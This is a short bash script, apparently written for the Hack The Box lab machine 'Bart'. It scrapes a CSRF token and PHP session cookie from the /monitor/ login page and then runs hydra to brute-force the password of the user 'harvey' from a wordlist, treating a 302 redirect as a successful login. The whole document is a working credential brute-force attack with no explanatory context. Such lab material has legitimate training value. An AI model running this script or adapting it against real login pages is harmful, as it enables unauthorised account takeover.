#!/bin/bash
RESPONSE=$(curl -c /tmp/tmp-cookies http://bart.htb/monitor/)
CSRF=$(echo $RESPONSE | awk -F 'name="csrf"' '{print $2}' | cut -d'"' -f2)
SESSIONID=$(cat /tmp/tmp-cookies | awk -F 'PHPSESSID' '{print $2}' | tr -d '\n' | tr -d '\t')
echo "csrf=$CSRF"
echo "phpsessid=$SESSIONID"
hydra -l harvey -P users.txt -V -I "http-post-form://bart.htb/monitor/:csrf=$CSRF&user_name=^USER^&user_password=^PASS^&action=login:S=302:H=Host: bart.htb:H:Cookie: PHPSESSID=$SESSIONID"
